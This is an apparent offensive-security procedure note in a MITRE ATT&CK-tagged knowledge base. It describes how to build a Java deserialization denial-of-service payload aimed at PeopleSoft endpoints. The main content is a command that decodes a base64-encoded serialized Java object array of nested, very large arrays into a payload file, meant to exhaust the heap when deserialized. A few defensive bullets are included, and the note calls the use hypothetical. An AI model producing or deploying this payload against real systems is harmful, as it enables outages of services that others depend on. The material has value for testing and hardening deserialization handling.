---
id: proc-uuid-005
tags:
  - dos
  - payload
  - deserialization
type: procedure
tools:
  - '[[tools/base64]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/echo-decode-dos-payload]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:23:20.505Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Generate-DoS-Payload-for-Deserialization

## Summary

This procedure generates a deserialization payload designed to cause an OutOfMemoryError by triggering infinite object creation, suitable for DoS against vulnerable Java endpoints (hypothetical in this PoC).

## Description

The payload is a base64-encoded array of Java Objects that, when deserialized, recursively creates instances leading to heap exhaustion. Targeted at the same PeopleSoft flaw but not executed to avoid real disruption.

## Requirements

1. Base64 utility available
2. Write access for output file

## Defense

Defensive measures and detection strategies:

- Limit deserialization depth and object types
- Monitor Java heap usage and alert on spikes
- Rate-limit POST requests to sensitive endpoints

## Objectives

1. Create DoS-capable serialized payload
2. Demonstrate resource exhaustion vector
3. Prepare for hypothetical deployment

## Instructions

### Step 1: Decode Base64 to Binary Payload

**Context**: Convert the encoded string to a usable binary file.

**Command** ([[commands/echo-decode-dos-payload]]):
```bash
echo -n "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YbxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3" | base64 -d > payload_dos
```

> Echoes the base64 string without newline, decodes it, and saves to file. Expected output: Binary 'payload_dos' file.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service

### Sub-Techniques


## Commands Used

- [[commands/echo-decode-dos-payload]]

## Tools Used

- [[tools/base64]]

## Tags

- [[dos]]
- [[payload]]
- [[deserialization]]
